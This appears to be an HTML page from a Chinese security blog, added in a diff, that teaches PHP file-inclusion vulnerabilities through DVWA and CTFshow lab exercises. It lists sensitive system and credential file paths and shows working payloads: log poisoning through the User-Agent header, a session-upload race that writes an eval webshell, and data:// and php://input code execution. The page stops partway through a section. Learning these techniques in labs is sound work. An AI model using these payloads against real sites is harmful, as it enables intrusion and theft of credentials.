@@ -1,0 +1,1044 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/phone_icon/hacker.png">
+  <link rel="icon" href="/img/browser_icon/hacker.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0z-sIHN">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞原理文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 漏洞原因：1、使用文件包含函数2、包含的文件可控 ‍ ‍ 基础知识‍ 文件包含常见函数1234567require()#函数出现错误的时候，会直接报错并退出程序的执行require_once()#只包含一次include()#在包含的过程中如果出现错误，会抛出一个警告，程序继续正">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞💼">
+<meta property="og:url" content="http://example.com/2024/03/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%F0%9F%92%BC/index.html">
+<meta property="og:site_name" content="0z-sIHN 的博客">
+<meta property="og:description" content="漏洞原理文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 漏洞原因：1、使用文件包含函数2、包含的文件可控 ‍ ‍ 基础知识‍ 文件包含常见函数1234567require()#函数出现错误的时候，会直接报错并退出程序的执行require_once()#只包含一次include()#在包含的过程中如果出现错误，会抛出一个警告，程序继续正">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/essay_cover_img/4.png">
+<meta property="article:published_time" content="2024-03-26T13:38:16.000Z">
+<meta property="article:modified_time" content="2024-11-10T14:43:07.038Z">
+<meta property="article:author" content="0z-sIHN">
+<meta property="article:tag" content="WEB攻防">
+<meta property="article:tag" content="文件包含漏洞">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/essay_cover_img/4.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>文件包含漏洞💼 - 0z-sIHN 的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0z-sIHN Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>联系我</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/essay_top_cover_bg/office.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件包含漏洞💼"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-26 21:38" pubdate>
+          2024年3月26日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          32 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">文件包含漏洞💼</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
+<p><strong>漏洞原因：</strong><br>1、使用文件包含函数<br>2、包含的文件可控</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>‍</p>
+<h2 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require</span>()<span class="hljs-comment">#函数出现错误的时候，会直接报错并退出程序的执行</span><br><span class="hljs-keyword">require_once</span>()<span class="hljs-comment">#只包含一次</span><br><span class="hljs-keyword">include</span>()<span class="hljs-comment">#在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span><br><span class="hljs-keyword">include_once</span>()<span class="hljs-comment">#只包含一次</span><br><span class="hljs-title function_ invoke__">highlight_file</span>()、<span class="hljs-title function_ invoke__">show_source</span>()<span class="hljs-comment">#函数对文件进行语法高亮显示，通常能看到源代码</span><br><span class="hljs-title function_ invoke__">readfile</span>()、<span class="hljs-title function_ invoke__">file_get_contents</span>()<span class="hljs-comment">#函数读取一个文件，并写入到输出</span><br><span class="hljs-title function_ invoke__">fopen</span>()<span class="hljs-comment">#打开一个文件或者url</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>三篇文章,包够的</p>
+<p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5535?time__1311=n4+xnieWqDqGqY5KBKDsj3O4mOqj2hx8e7I=+Qx">浅析php文件包含及其getshell的姿势</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121276653">文件包含漏洞+php伪协议_文件包含漏洞伪协议利用-CSDN博客</a></p>
+<p><img src="/assets/image-20240803190856-0kglqv4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h2 id="日志文件权限"><a href="#日志文件权限" class="headerlink" title="日志文件权限"></a>日志文件权限</h2><p>在linux 下日志文件权限默认是 root 而php 的权限是 www-data 一般情况下都是读取不了，如果是 windows</p>
+<p>环境下是可以权限是允许的。</p>
+<p>linux 默认的 apache 日志文件路径是</p>
+<ul>
+<li><p>访问日志</p>
+<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
+</li>
+<li><p>错误日志</p>
+<p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</p>
+</li>
+</ul>
+<p>‍</p>
+<h2 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h2><ol>
+<li><h3 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">C:\boot.ini <span class="hljs-comment">//查看系统版本</span><br>C:\Windows\System32\inetsrv\MetaBase.xml <span class="hljs-comment">//IIS配置文件</span><br>C:\Windows\repair\sam <span class="hljs-comment">//存储系统初次安装的密码</span><br>C:\Program Files\mysql\my.ini <span class="hljs-comment">//Mysql配置</span><br>C:\Program Files\mysql\data\mysql\user.MYD <span class="hljs-comment">//Mysql root</span><br>C:\Windows\php.ini <span class="hljs-comment">//php配置信息</span><br>C:\Windows\my.ini <span class="hljs-comment">//Mysql配置信息</span><br></code></pre></td></tr></table></figure></li>
+<li><h3 id="Linux-Unix系统"><a href="#Linux-Unix系统" class="headerlink" title="Linux&#x2F;Unix系统"></a>Linux&#x2F;Unix系统</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">/root/.ssh/authorized_keys <span class="hljs-comment">//如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br>/root/.ssh/id_rsa <span class="hljs-comment">//ssh私钥,ssh公钥是id_rsa.pub</span><br>/root/.ssh/id_ras.keystore <span class="hljs-comment">//记录每个访问计算机用户的公钥</span><br>/root/.ssh/known_hosts<br><span class="hljs-comment">//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。</span><br>/etc/passwd <span class="hljs-comment">// 账户信息</span><br>/etc/shadow <span class="hljs-comment">// 账户密码文件</span><br>/etc/my.cnf <span class="hljs-comment">//mysql 配置文件</span><br>/etc/httpd/conf/httpd.conf <span class="hljs-comment">// Apache配置文件</span><br>/root/.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br>/root/.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br>/proc/<span class="hljs-built_in">self</span>/fd/fd[<span class="hljs-number">0</span>-<span class="hljs-number">9</span>]*(文件标识符)<br>/proc/mounts <span class="hljs-comment">//记录系统挂载设备</span><br>/porc/config.gz <span class="hljs-comment">//内核配置文件</span><br>/<span class="hljs-keyword">var</span>/lib/mlocate/mlocate.db <span class="hljs-comment">//全文件路径</span><br>/porc/<span class="hljs-built_in">self</span>/cmdline <span class="hljs-comment">//当前进程的cmdline参数</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>‍</p>
+<p>‍</p>
+<h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>黑盒发现：主要观察参数传递的数据和文件名是否对应<br>URL中有path、dir、file、pag、page、archive、p、eng、语言文件等相关字眼</p>
+<p>思路:</p>
+<p>1、配合文件上传（上传一个文件 文件写有我们的恶意代码）<br>2、无文件包含日志<br>3、无文件包含SESSION<br>4、无文件支持伪协议利用<br>​<code>php://input</code>​与<code>data://</code>​都需要开启<code>allow_url_include</code>​才能使用</p>
+<p><img src="/assets/image-20240803103610-3irl60r.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>思路:</p>
+<p>1、可通过应用功能追踪代码定位审计<br>2、可通过脚本特定函数搜索定位审计<br>3、可通过伪协议玩法绕过相关修复等</p>
+<p>重要函数</p>
+<ul>
+<li><strong>PHP</strong>：<code>include</code>​、<code>require</code>​、<code>include_once</code>​、<code>require_once</code>​等<br>include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行<br>require函数出现错误的时候，会直接报错并退出程序的执行</li>
+<li><strong>Java</strong>：<code>java.io.File</code>​、<code>java.io.FileReader</code>​等</li>
+<li><strong>ASP.NET</strong>：<code>System.IO.FileStream</code>​、<code>System.IO.StreamReader</code>​等</li>
+</ul>
+<p>‍</p>
+<p>‍</p>
+<h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><p>‍</p>
+<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含-LFI"></a>本地文件包含-LFI</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>简单复现：</p>
+<p>创建include.php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用include函数来包含<code>$_GET[&#39;file&#39;]</code>​，这是危险的做法，因为用户可以通过修改URL参数传递恶意文件路径，导致安全漏洞。</p>
+<p>创建1.txt</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php phpinfo();?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>访问对应文件路径，并传递参数</p>
+<p><img src="/assets/image-20240802201302-yo9uqcs.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>‍</p>
+<h4 id="1、配合文件上传（上传一个文件-文件写有我们的恶意代码）"><a href="#1、配合文件上传（上传一个文件-文件写有我们的恶意代码）" class="headerlink" title="1、配合文件上传（上传一个文件 文件写有我们的恶意代码）"></a>1、配合文件上传（上传一个文件 文件写有我们的恶意代码）</h4><p>文件上传图片马</p>
+<ol>
+<li><p>这里选择使用dvwa靶场，Security Level等级为low，上传一个图片马，内容如下</p>
+<p> <img src="/assets/image-20240415005028-f47r49p.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>然后上传图片马，这里可以看到上传文件的路径<code>../../hackable/uploads/s.jpg</code>​</p>
+<p> <img src="/assets/image-20240415004929-hteo1p1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>这里是dvwa文件包含漏洞页面</p>
+<p> <img src="/assets/image-20240415003529-vrjse4t.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>这里查看漏洞源码</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>这里没有做任何过滤，直接利用漏洞</p>
+<p> <img src="/assets/image-20240415005145-qn41cdq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ol>
+<p>‍</p>
+<h4 id="2、无文件包含日志"><a href="#2、无文件包含日志" class="headerlink" title="2、无文件包含日志"></a>2、无文件包含日志</h4><p>前提条件</p>
+<ul>
+<li><p>知道日志文件储存目录</p>
+</li>
+<li><p>日志文件可读</p>
+</li>
+</ul>
+<p>使用<strong>日志记录文件包含，利用日志记录UA信息，UA带入代码</strong></p>
+<p>1、使用文件读取：<code>file:///var/log/nginx/access.log</code>​ ，读取对应的日志文件内容（绝对路径），成功读取</p>
+<p><img src="/assets/image-20240803171728-qhf4gw3.png" srcset="/img/loading.gif" lazyload alt="image"><br>2、通过抓包，抓取到数据包，发送至repeater，并尝试修改UA头中的内容，修改成功</p>
+<p><img src="/assets/image-20240803171753-ndx8cxv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>于是尝试在UA头中写入恶意代码：<br>​<code>User-Agent: 222222222&lt;?php system(&#39;ls&#39;)?&gt;</code>​并发送数据包，成功写入，并被解析fl0g.php index.php</p>
+<p><img src="/assets/image-20240803171811-t0cj2rq.png" srcset="/img/loading.gif" lazyload alt="image"><br>​<code>User-Agent: 333333333&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>​并发送数据包，成功写入</p>
+<p><img src="/assets/image-20240803171821-zg9gy6i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h4 id="3、无文件包含SESSION"><a href="#3、无文件包含SESSION" class="headerlink" title="3、无文件包含SESSION"></a>3、无文件包含SESSION</h4><p>前提条件</p>
+<ul>
+<li>找到Session内的可控变量</li>
+<li>Session文件可读写，并且知道存储路径</li>
+</ul>
+<p><img src="/assets/image-20240803172037-z98gjoq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>确保以下配置项在 php.ini 文件中已启用</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure>
+
+<p>1、在本地创建文件上传代码如下，并将<strong>上传URL更改为对应的靶场网址</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;目标网址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;?&gt;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>2、运行创建的网址，并随意上传文件，通过burp抓包，并加入<code>Cookie: PHPSESSID=wusuowei</code>​，自定义Session ID</p>
+<p><img src="/assets/image-20240803172323-cdt2bz3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>3、由于<code>session.upload_progress.cleanup</code>​是开启的，<strong>一旦读取了所有POST数据，就会清除进度信息</strong>于是我们需要条件竞争来读取文件，所谓条件竞争简单来说是<strong>在执行系统命令前先执行完自己的代码</strong>。</p>
+<ol>
+<li><p>将上传文件的数据包发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送上传文件数据包）</p>
+<p> <img src="/assets/image-20240803172517-5it91j6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20240803172527-zs4g5sd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>将访问上传文件的请求数据包抓取并发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送访问请求数据包）</p>
+<p> <a target="_blank" rel="noopener" href="http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file%5C=/tmp/sess%5C_wusuowei">http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file\=/tmp/sess\_wusuowei</a></p>
+<p> <img src="/assets/image-20240803172556-85pkdlq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20240803172606-5cc9vzz.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+</li>
+</ol>
+<p>‍</p>
+<h4 id="4、无文件支持伪协议利用"><a href="#4、无文件支持伪协议利用" class="headerlink" title="4、无文件支持伪协议利用"></a>4、无文件支持伪协议利用</h4><p>白盒利用-CTFSHOW-伪协议</p>
+<ol>
+<li><p>WEB—78—php-http协议</p>
+<p> <img src="/assets/image-20240803164801-sl2l6bd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 1、代码给出include文件包含的关键词</p>
+<p> 2、由于是无文件上传，所以使用无文件支持伪协议利用</p>
+<p> 3、两种方式：<br> 第一种</p>
+<p> 直接通过文件读取 <strong>（相对路径）</strong>​<code>php://filter/read=convert.base64-encode/resource=flag.php</code>​<strong>读取名为flag.php的文件（当前网址存放源码目录下）</strong> ，并将其内容以base64编码的形式返回，并通过解密拿到flag。</p>
+<p> <img src="/assets/image-20240803165048-ipu4evn.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 第二种</p>
+<p> 使用文件执行<br> ​<code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code>​ 可以获取当前目录文件发现有一个flag.php<br> ​<code>?file=data://text/plain,&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code>​ 即可读取flag.php的中的内容。<br> <strong>system函数执行tac命令，该命令用于反向输出文件内容（以行为单位）。在这里，它尝试反向输出flag.php文件的内容。如果flag.php</strong>文件存在并可读，那么该文件的内容将被反向显示。</p>
+<p> <img src="/assets/image-20240803165534-us6zmmw.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20240803165557-gq5gvou.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>WEB—79—data-http协议</p>
+<p> 与78相比对php关键词进行了过滤</p>
+<p> 在PHP中，<code>&lt;?= ... ?&gt;</code>​ 是短标签（short tags）的一种形式，用于简洁地输出内容，等同于 <code>&lt;?php echo ... ?&gt;</code>​。而 <code>&lt;?php ... ?&gt;</code>​ 是标准的PHP起始和结束标记。<br> 两种方式：</p>
+<p> 第一种</p>
+<p> 将文件执行中，直接去掉php关键词，依旧可以正常执行<br> ​<code>?file=data://text/plain,&lt;?=system(&#39;ls&#39;);?&gt;;</code>​ 可以获取当前目录文件发现有一个flag.php</p>
+<p> <img src="/assets/image-20240803170818-7b60wf7.png" srcset="/img/loading.gif" lazyload alt="image"><br> ​<code>?file=data://text/plain,&lt;?=system(&#39;tac flag*&#39;);?&gt;</code>​ 即可读取flag.php的中的内容。成功获取到flag</p>
+<p> 第二种<br> 使用文件执行，将数据流协议（data:&#x2F;&#x2F;）和base64编码的方式，将PHP代码嵌入URL中<br> ​<code>data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</code>​<br> 解码为：<code>&lt;?php system(&#39;tac flag.php&#39;); ?&gt;</code>​</p>
+<p> <img src="/assets/image-20240803170855-t2xpwx6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20240803170903-4w3zmdf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>WEB—80、81—日志包含</p>
+<p> <img src="/assets/image-20240803171046-tjx1yul.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 1、代码给出include文件包含的关键词</p>
+<p> 2、由于是无文件上传，所以使用无文件支持伪协议利用</p>
+<p> 3、发现对与文件名做了php关键词和data关键词过滤</p>
+<p> 4、两种方式：</p>
+<p> 第一种</p>
+<p> 使用文件执行<code>PHP://input</code>​，并使用短标签绕过其对php的过滤</p>
+<p> <code>?file=PHP://input </code>​</p>
+<p> <code>POST data：&lt;?=system(&#39;ls&#39;);?&gt;</code>​</p>
